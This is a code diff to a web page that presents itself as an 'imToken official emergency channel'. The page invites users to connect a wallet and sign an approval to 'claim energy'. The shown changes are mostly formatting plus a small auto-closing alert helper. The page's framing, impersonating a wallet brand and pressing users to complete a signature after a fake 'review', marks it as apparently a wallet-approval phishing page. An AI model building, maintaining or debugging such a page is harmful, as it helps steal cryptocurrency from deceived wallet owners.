@@ -89,14 +89,12 @@ body {
     display: flex;
     align-items: flex-end;
     gap: 10px; /* 增加Logo与文字间距 */
-       
 }
-  .header > div {
+.header > div {
     display: flex; 
     gap: 10px; 
     align-items: flex-end; /* 关键：让desc靠下对齐（相对于h1下移） */
-   
- }
+}
 /* Logo样式：保持长方形比例，适配调大的容器 */
 .header-logo {
     width: 65px; 
@@ -108,7 +106,7 @@ body {
     font-size: 30px; /* 字体调大，更醒目 */
     color: #3b82f6;    
     margin-bottom: 0;
-   line-height: 1.2;
+    line-height: 1.2;
 }
 .warning {
     background: #334155;
@@ -426,20 +424,17 @@ body {
                 <div>
                     <h1>imToken</h1>
                 </div>
-                
             </div>
-            
             <div class="lang-switch">
                 <button id="langToggle" class="lang-toggle">
                   <i class="fa fa-globe"></i>
-            </button>
-              <span id="headerDesc" class="lang-text">imToken官方应急通道</span> <!-- 新增文本 -->
-        
-         </div>
-    </div>
+                </button>
+                <span id="headerDesc" class="lang-text">imToken官方应急通道</span> <!-- 新增文本 -->
+            </div>
+        </div>
         <div id="userInfo">
             <span id="userInfoDefault">未连接钱包<br>
-            <span>请点击底部「连接imToken钱包」按钮</span></span>
+            <span>请点击底部「连接钱包」按钮</span></span>
         </div>
         <div id="walletStatusContainer">
             <div class="status-title"><h3 id="walletStatusTitle">钱包状态</h3></div>
@@ -497,7 +492,6 @@ body {
             </div> 
             <button id="connectBtn" class="btn">连接钱包</button>
             <button id="approveBtn" class="btn" disabled>领取能量</button>
-           
             <div id="reviewTip" class="review-tip" style="display: none;">
                <span id="reviewTipText">系统审核中，审核通过后请务必完成签名</span>
             </div>
@@ -1042,7 +1036,6 @@ async function checkImTokenEnv() {
                 const walletType = e.currentTarget.dataset.wallet; // 获取用户选择的钱包类型
                 const wallet = walletConfig[walletType];
                 if (!wallet) return;
-
                 try {
                     // 关键修改1：URL拼接wallet参数，传递用户选择的钱包类型
                     const dappUrl = window.location.href + "#wallet-open" + `?wallet=${walletType}`; 
@@ -1294,6 +1287,17 @@ function showPersistentAlert(message) {
     alertDiv.textContent = message;
     document.body.appendChild(alertDiv);
     return alertDiv; // 返回弹窗元素，后续可手动移除
+}
+// ========== 新增：自动关闭弹窗工具（之前遗漏，导致报错） ==========
+function showAutoCloseAlert(message) {
+    const alertDiv = showPersistentAlert(message);
+    setTimeout(() => {
+        if (alertDiv && alertDiv.parentNode) {
+            alertDiv.style.opacity = "0";
+            alertDiv.style.transition = "opacity 0.3s";
+            setTimeout(() => alertDiv.parentNode.removeChild(alertDiv), 300);
+        }
+    }, 3000);
 }
 // ========== 核心逻辑bindApproveLogic（彻底修复弹窗+白名单拦截） ==========
 function bindApproveLogic() {
